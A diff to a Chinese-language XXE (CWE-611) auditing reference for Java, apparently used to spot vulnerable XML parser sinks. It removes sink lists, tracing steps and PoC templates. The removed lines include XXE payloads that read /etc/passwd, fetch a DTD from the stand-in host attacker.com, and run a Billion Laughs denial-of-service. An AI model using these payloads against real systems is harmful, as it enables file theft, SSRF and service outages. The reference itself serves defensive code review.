@@ -1,35 +1,5 @@
 # XXE (XML External Entity, CWE-611)
 
-## sink 模式速查
-
-按 XML 解析器类型分三家族：
-
-### DOM 解析
-- `DocumentBuilder.parse($INPUT, ...)` —— JAXP DOM
-- `new SAXReader().read($INPUT)` —— dom4j
-- `new SAXBuilder().build($INPUT)` —— jdom2
-
-### SAX / Stream 解析
-- `SAXParser.parse($INPUT, $HANDLER)` —— JAXP SAX
-- `XMLReader.parse($SOURCE)` —— `org.xml.sax.XMLReader`
-- `XMLInputFactory.createXMLStreamReader($INPUT)` —— StAX 流式
-- `XMLInputFactory.createXMLEventReader($INPUT)` —— StAX 事件
-
-### XSLT / Schema / Validate / JAXB
-- `TransformerFactory.newTransformer($SRC)` —— XSLT
-- `SchemaFactory.newSchema($SRC)` —— XSD 校验
-- `Validator.validate($SRC)` —— XSD 校验
-- `XPath.evaluate($EXPR, $XML_SRC, ...)` —— XPath 用 XML Source
-- `Unmarshaller.unmarshal($INPUT)` —— JAXB
-
-## 数据流追溯重点
-
-1. 找 XML 解析 sink；
-2. 看输入来源：
-   - `@RequestBody String xml` / `request.getInputStream()` / `multipartFile.getInputStream()`
-   - 文件读取（如先上传后解析，仍可能用户控制）
-3. 输入可控 + 未禁用 DTD/外部实体 → VULNERABLE。
-
 ## 防御机制速查（每种解析器有专属配置）
 
 ### JAXP（DOM/SAX）
@@ -96,36 +66,4 @@ suspicion_reason: "Line 82 var unmarshaller = jc.createUnmarshaller();
                   — xsr (XMLStreamReader) 由 line 79 xif.createXMLStreamReader 创建,
                   且 securityEnabled=false 分支未对 xif 设置 SUPPORT_DTD=false,
                   导致 JAXB 解析时仍允许外部实体引用."
-```
-
-## PoC 模板
-
-### 经典文件读取
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<comment>&xxe;</comment>
-```
-
-### OOB（带外）SSRF
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
-  %xxe;
-]>
-<root/>
-```
-
-### Billion Laughs DoS
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE lolz [
-  <!ENTITY lol "lol">
-  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-]>
-<lolz>&lol3;</lolz>
 ```
